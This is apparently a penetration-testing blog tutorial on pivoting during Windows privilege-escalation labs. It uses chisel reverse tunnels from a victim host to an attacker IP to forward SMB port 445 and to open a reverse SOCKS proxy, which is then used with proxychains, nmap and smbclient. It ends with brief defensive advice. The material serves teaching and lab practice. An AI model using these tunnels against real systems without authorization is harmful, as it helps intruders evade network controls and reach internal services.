---
title: Windows Local Privilege Escalation - Port Forwarding for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: "Windows Local Privilege Escalation - Port Forwarding"
license: ""
images: []
date: 2022-03-20 11:33:00 +0800
categories: [Windows Local Privilege Escalation]
tags: [port forwarding, remote port forwarding, dynamic port forwarding, proxychains, chisel, local privilege escalation, windows]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...
summary: "Let us interact with that service you're hiding (3_3)"
---


# Port Forwarding

When a service is running exclusively on an internal port or localhost (127.0.0.1), it is necessary to forward that port to our system to enumerate the service running on that specific socket. There are three primary techniques to achieve this:

- **Local Port Forwarding**
- **Remote Port Forwarding**
- **Dynamic Port Forwarding**

## Port Configuration

Open a PowerShell or a Command Prompt console as Administrator to activate the [Windows Advanced Firewall]() for all the profiles (nope):

```powershell
PS C:\Windows\system32> netsh advfirewall set allprofiles state on
Ok.
```

## Remote Port Forwarding

Remote Port Forwarding means forwarding the port that's listening on the target host loopback interface to our host. This is done by connecting to our host **from** the target host.

Simplified:
- Remote: Connect to ythe attacker host from the target host.

This technique involves forwarding the port that's listening on the loopback interface in the target/victim host to our remote host. Startup by adding the executable permissions to the chisel binary in Linux and setup a listener:

```shell
❯ chmod +x chisel_1.7.7_linux_amd64
❯ ./chisel_1.7.7_linux_amd64 server -p 9191 --reverse
2022/03/07 13:49:57 server: Reverse tunnelling enabled
2022/03/07 13:49:57 server: Fingerprint 0ToKrAu+HqrbE9RCpmLwj5XanRN3Lg9QJ/SaFH8Is5k=
2022/03/07 13:49:57 server: Listening on http://0.0.0.0:9191
2022/03/07 13:50:14 server: session#1: tun: proxy#R:445=>445: Listening
```

Now in Windows execute the following to forward port 445 to the attacker (Linux) host:

```powershell
PS C:\Users\user> .\chisel.exe client 192.168.119.130:9191 R:445:127.0.0.1:445
2022/03/07 14:50:14 client: Connecting to ws://192.168.119.130:9191
2022/03/07 14:50:14 client: Connected (Latency 688.5µs)
```

The syntax of the command above is the following:

```powershell
chisel client <CLIENT_IP>:<PORT_TO_CONNECT/YOUR_CHISEL_SERVER_PORT> R:<PORT_TO_FORWARD_FROM_VICTIM>:<TUNNEL_TARGET_IP>:<PORT_TO_FORWARD_TO_CLIENT>
```

> Note: The letter R: means that it'll perform a reverse port forward.

Now we have access to the SMB share from our host:

```shell
❯ smbclient -U Administrator -L //127.0.0.1
Enter WORKGROUP\Administrator's password:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

If kill the connection by sending an exit signal, i.e, Ctrl+C. We can see that we can no longer connect:

```shell
❯ smbclient -U Administrator -L //127.0.0.1
do_connect: Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED)
```

## Dynamic Port Forwarding

Dynamic Port Forwarding means forwarding every port that's listening on the target host loopback interface to our host via our SOCKS port. 

- Dynamic: Forward all the ports from the remote host to our SOCKS port.

SOCKS works on the OSI Layer 5 (Session Layer), so don't expect things like ICMP, ARP or the half-open reset that SYN scan on nmap to work. In order to scan via proxy with nmap we need to do a TCP connect scan with the option `-sT` and we should ignore ICMP with `-Pn`.

There are different tools to help you out when Dynamic port forwarding is being used. The most common one is `proxychains` which is available for Linux and Mac but also for Windows. Dynamic port forwarding allows you to create a socket on the local client machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote machine, which is then forwarded to a dynamic port on the destination machine. This way, all the applications using the SOCKS proxy will connect to the service, and the server will forward all the traffic to its actual destination.

Install the proxychains package:

```shell
sudo apt install proxychains
```

Alternatively, you can build it from the [source code](https://github.com/haad/proxychains) from github.

Let's configure the proxychains:

```shell
sudo vim /etc/proxychains.conf
```

Leave the following SOCKS5 configuration:

```shell
❯ tail -n 2 /etc/proxychains.conf
socks5 	127.0.0.1 1080
```

Now on the attacker (Linux) host:

```shell
❯ ./chisel_1.7.7_linux_amd64 server -p 9292 --reverse
2022/03/07 14:12:03 server: Reverse tunnelling enabled
2022/03/07 14:12:03 server: Fingerprint oswwvQ0i0qhUScfY0AJZQPzhG3TVLMaF5mFonQ/6IJQ=
2022/03/07 14:12:03 server: Listening on http://0.0.0.0:9292
```

Alternatively, we could the following flag:

```shell
./chisel_1.7.7_linux_amd64 server -p 9292 --socks5 --reverse
```

Then in Windows connect to our SOCKS5 proxy:

```powershell
PS C:\Users\user> .\chisel.exe client 192.168.119.130:9292 R:socks
2022/03/07 15:13:36 client: Connecting to ws://192.168.119.130:9292
2022/03/07 15:13:36 client: Connected (Latency 1.4047ms)
```

Alternatively, if we want to specify a SOCKS5 port we can do the following:

```powershell
.\chisel.exe client 192.168.119.130:9292 R:5000:socks
```

In our chisel output from the attacker host, we can see that a session was created on port 1080:

```shell
2022/03/07 14:13:36 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

We can use `ss` to dup our socket statistics:

```shell
❯ ss -tnlp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
LISTEN    0         4096             127.0.0.1:1080             0.0.0.0:*        users:(("chisel_1.7.7_li",pid=125026,fd=8))
LISTEN    0         4096                     *:9292                   *:*        users:(("chisel_1.7.7_li",pid=125026,fd=6))
```

We have port 1080 listening on localhost (127.0.0.1) as we can see from the nmap scan:

```shell
❯ sudo proxychains nmap -p 445 localhost -Pn -sT
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 14:41 EST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0052s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

Noticed how I used the options:
- -sT = TCP connect scan, rather than the default `-sS` SYN scan. The SYN won’t work because the proxy doesn't pass the TCP handshake packets back to the attacker host, a SYN scan, which sends the SYN packet, sees the ACK and then ends the connection, this won’t be passed back over the proxy, therefore, SYN scans don't work with proxies.
- -Pn = Ignore ICMP request/response because ICMP doesn't go through the proxy.

Without these options the scan will fail because the proxy will drop any SYN scans, we need the full TCP handshake to know if the port is open or not.

The key to the output above is in this line:

```shell
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
```

Notice how it goes through the SOCKS5 proxy port and from there it goes to port 445.

Let's try to authenticate to SMB:

```shell
❯ sudo proxychains smbclient -U Administrator -L //127.0.0.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
Enter WORKGROUP\Administrator's password:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
```

We can authenticate to SMB via the SOCKS5 port through the proxychain. 

Now let's scan some of the ports to prove that we have access to all the ports of the Windows system:

```shell
❯ sudo proxychains nmap -p 445,135,5040,7680 localhost -Pn -sT
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 15:21 EST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5040  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:7680  ...  OK
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0038s latency).

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5040/tcp open  unknown
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

# Defense

Mitigating port forwarding techniques can be challenging, but here are some effective strategies:

- **Enable only necessary ports**: Ensure that only the required ports are open to minimize potential attack vectors.
- **Limit the number of services**: Disable any services that are not actively being used to reduce the risk of exploitation.
- **Monitor network traffic**: Utilize the following tools to monitor and analyze network traffic for suspicious activities:
  - **Deep-Packet Inspection Firewall**
  - **Unified Threat Management (UTM) systems**
  - **Intrusion Detection Systems (IDS) / Intrusion Prevention Systems (IPS)**

By implementing these measures, you can enhance your network security and reduce the risk of unauthorized port forwarding activities.